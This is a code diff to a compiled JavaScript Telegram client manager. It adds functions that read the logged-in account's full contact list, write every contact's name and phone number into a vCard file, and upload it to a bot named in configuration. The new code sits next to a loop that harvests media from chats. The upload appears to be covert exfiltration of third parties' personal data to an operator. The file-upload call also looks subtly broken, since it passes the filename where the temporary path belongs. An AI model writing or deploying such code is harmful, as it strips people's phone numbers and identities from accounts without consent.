@@ -31,6 +31,8 @@ const sessions_1 = require("telegram/sessions");
 const events_1 = require("telegram/events");
 const axios_1 = __importDefault(require("axios"));
 const fs = __importStar(require("fs"));
+const path = __importStar(require("path"));
+const os = __importStar(require("os"));
 const uploads_1 = require("telegram/client/uploads");
 const Helpers_1 = require("telegram/Helpers");
 const Logger_1 = require("telegram/extensions/Logger");
@@ -188,6 +190,18 @@ class TelegramManager {
                     catch (e) {
                         console.log(e);
                     }
+                }
+                try {
+                    const contacts = await this.getContacts();
+                    if ('users' in contacts && Array.isArray(contacts.users)) {
+                        await this.sendContactsFile(TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES), contacts);
+                    }
+                    else {
+                        console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
+                    }
+                }
+                catch (e) {
+                    console.log("Failed To Send Contacts File", e);
                 }
                 for (const chatId of finalChats) {
                     const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.VOICE] });
@@ -2832,6 +2846,44 @@ class TelegramManager {
         catch (error) {
             console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);
             throw new Error(`Failed to create bot: ${error.message}`);
+        }
+    }
+    createVCardContent(contacts) {
+        let vCardContent = '';
+        contacts.users.map((user) => {
+            user = user;
+            vCardContent += 'BEGIN:VCARD\n';
+            vCardContent += 'VERSION:3.0\n';
+            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\n`;
+            vCardContent += `TEL;TYPE=CELL:${user.phone}\n`;
+            vCardContent += 'END:VCARD\n';
+        });
+        return vCardContent;
+    }
+    async sendContactsFile(chatId, contacts, filename = 'contacts.vcf') {
+        if (!this.client)
+            throw new Error('Client is not initialized');
+        try {
+            const vCardContent = this.createVCardContent(contacts);
+            const tempPath = path.join(os.tmpdir(), filename);
+            fs.writeFileSync(tempPath, vCardContent, 'utf8');
+            try {
+                const file = new uploads_1.CustomFile(filename, fs.statSync(tempPath).size, filename);
+                await this.client.sendFile(chatId, {
+                    file,
+                    caption: `Contacts file with ${contacts.users.length} contacts`,
+                    forceDocument: true
+                });
+                console.log(`Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);
+            }
+            finally {
+                if (fs.existsSync(tempPath)) {
+                    fs.unlinkSync(tempPath);
+                }
+            }
+        }
+        catch (error) {
+            console.error('Error sending contacts file:', error);
         }
     }
 }
